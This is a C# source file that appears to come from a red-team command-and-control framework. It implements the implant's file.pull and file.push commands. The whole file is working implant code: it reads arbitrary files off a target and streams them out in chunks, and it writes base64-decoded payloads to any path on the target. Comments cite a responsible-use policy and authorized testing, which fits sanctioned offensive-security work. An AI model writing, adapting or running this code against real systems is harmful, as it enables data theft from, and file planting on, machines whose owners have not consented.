using System.Text;
using Rod.V1;
using SysFile = System.IO.File;

namespace Rod.Implant.Internal;

// Holds the core file-transfer verbs the reference implant advertises
// (architecture.md Sec 10.1, the "core" category): file.pull downloads a file
// off the target and file.push uploads one onto it -- the two-direction
// baseline every C2 exposes. Small pulls return inline in the TaskResult
// output; larger ones stream as ExfilChunk frames into the engagement artifact
// store. A push rides the task arguments as base64 and lands on disk whole;
// the size cap keeps one push inside the single-frame budget, so anything
// larger waits for a staged upload path (the per-verb typed-arm escape hatch,
// architecture.md Sec 10) rather than failing mid-transfer.
//
// Argument shape:
//
//   file.pull <path>
//   file.push <path> <base64>
//
// As with the other reference handlers, this performs no evasion, no
// obfuscation, and no destructive behavior (RESPONSIBLE-USE.md, architecture.md
// Sec 7). The operator is responsible for targeting only systems they are
// authorized to test.

internal static class Files
{
    // The largest file payload returned inline in a TaskResult. Files at or
    // below this size are returned whole in the output string; larger files are
    // returned as ExfilChunk frames so the operator retrieves the whole thing
    // through the artifact store. 1 MiB matches the teamserver's per-frame
    // budget (architecture.md Sec 11).
    private const int MaxInlineBytes = 1 << 20; // 1 MiB

    // The largest decoded push accepted in a single task: its base64 text rides
    // the TaskRequest arguments string, which must fit the 2 MiB downstream
    // frame budget with protobuf overhead to spare.
    private const int MaxPushBytes = 1 << 20; // 1 MiB

    // The size of each ExfilChunk data payload for files streamed out of band.
    // Kept well under the gRPC frame ceiling so a marshaled Frame still fits
    // with room to spare.
    private const int ChunkSize = 512 * 1024; // 512 KiB

    /// <summary>
    /// Reads the file at the given path off the target. Small files return
    /// Succeeded with the contents in the output string; large files return
    /// Succeeded with a short manifest line in the output and the contents
    /// spread across ExfilChunk frames the beacon streams to the artifact
    /// store.
    /// </summary>
    public static (TaskOutcome Outcome, string Output, IReadOnlyList<ExfilChunk> Chunks) Pull(string arguments)
    {
        var path = arguments.Trim();
        if (path.Length == 0)
            return (TaskOutcome.Failed, "file.pull expects '<path>'", Array.Empty<ExfilChunk>());

        if (!SysFile.Exists(path))
        {
            // Exists is false for both missing files and directories; distinguish
            // so the operator sees the cause rather than guessing.
            if (Directory.Exists(path))
                return (TaskOutcome.Failed,
                    "file.pull refuses to dump a directory: " + path, Array.Empty<ExfilChunk>());
            return (TaskOutcome.Failed, "stat " + path + ": file not found", Array.Empty<ExfilChunk>());
        }

        byte[] data;
        try
        {
            data = SysFile.ReadAllBytes(path);
        }
        catch (Exception ex)
        {
            return (TaskOutcome.Failed, "read " + path + ": " + ex.Message, Array.Empty<ExfilChunk>());
        }

        // Small enough to return inline: report the bytes verbatim.
        if (data.Length <= MaxInlineBytes)
        {
            return (TaskOutcome.Succeeded, Encoding.UTF8.GetString(data), Array.Empty<ExfilChunk>());
        }

        // Too large for a TaskResult: stream as ExfilChunk frames. The output
        // carries a short manifest; the chunks carry the bytes.
        var name = Path.GetFileName(path);
        var chunks = ChunkFile(name, "application/octet-stream", data);
        return (TaskOutcome.Succeeded,
            $"{path}: {data.Length} bytes, {chunks.Count} chunks streamed to artifact store",
            chunks);
    }

    /// <summary>
    /// Writes base64-decoded bytes to the given path on the target, creating
    /// the parent directory when it does not exist. A decoded payload over
    /// <see cref="MaxPushBytes"/> is refused with the cap named so the operator
    /// knows the ceiling, not just the failure.
    /// </summary>
    public static (TaskOutcome Outcome, string Output) Push(string arguments)
    {
        // The base64 payload is the tail after the last space (base64 contains
        // no spaces); the path is everything before it, spaces included, so the
        // split is unambiguous in both directions.
        var separator = arguments.LastIndexOf(' ');
        if (separator < 0)
            return (TaskOutcome.Failed, "file.push expects '<path> <base64>'");
        var path = arguments[..separator].Trim();
        var encoded = arguments[(separator + 1)..].Trim();
        if (path.Length == 0 || encoded.Length == 0)
            return (TaskOutcome.Failed, "file.push expects '<path> <base64>'");

        byte[] data;
        try
        {
            data = Convert.FromBase64String(encoded);
        }
        catch (FormatException)
        {
            return (TaskOutcome.Failed, "file.push: payload is not valid base64");
        }

        if (data.Length > MaxPushBytes)
            return (TaskOutcome.Failed,
                $"file.push: payload of {data.Length} bytes exceeds the {MaxPushBytes}-byte single-task cap");

        try
        {
            var parent = Path.GetDirectoryName(Path.GetFullPath(path));
            if (!string.IsNullOrEmpty(parent))
                Directory.CreateDirectory(parent);
            SysFile.WriteAllBytes(path, data);
        }
        catch (Exception ex)
        {
            return (TaskOutcome.Failed, "write " + path + ": " + ex.Message);
        }

        return (TaskOutcome.Succeeded, $"wrote {data.Length} bytes to {path}");
    }

    // Slices a byte buffer into ExfilChunk frames of ChunkSize via the shared
    // chunker (0-origin sequences, terminal on the last chunk); the server
    // reassembles strictly by sequence and flushes on the terminal frame.
    internal static IReadOnlyList<ExfilChunk> ChunkFile(string name, string contentType, byte[] data)
        => Chunking.ChunkFile(name, contentType, data, ChunkSize);
}
